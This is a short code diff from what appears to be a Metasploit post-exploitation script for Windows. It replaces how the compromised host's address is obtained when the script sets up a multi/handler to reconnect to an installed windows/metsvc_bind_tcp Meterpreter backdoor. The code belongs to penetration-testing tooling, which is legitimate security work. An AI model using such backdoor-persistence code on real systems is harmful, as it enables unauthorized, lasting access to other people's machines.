@@ -104,12 +104,12 @@ if client.platform =~ /win32|win64/
 	# Setup the multi/handler if requested
 	#
 	if(autoconn)
-		print_status("Trying to connect to the Meterpreter service at #{client.tunnel_peer.split(':')[0]}:#{rport}...")
+		print_status("Trying to connect to the Meterpreter service at #{client.session_host}:#{rport}...")
 		mul = client.framework.exploits.create("multi/handler")
 		mul.datastore['WORKSPACE'] = client.workspace
 		mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
 		mul.datastore['LPORT']   = rport
-		mul.datastore['RHOST']   = client.tunnel_peer.split(':')[0]
+		mul.datastore['RHOST']   = client.session_host
 		mul.datastore['ExitOnSession'] = false
 		mul.exploit_simple(
 			'Payload'        => mul.datastore['PAYLOAD'],
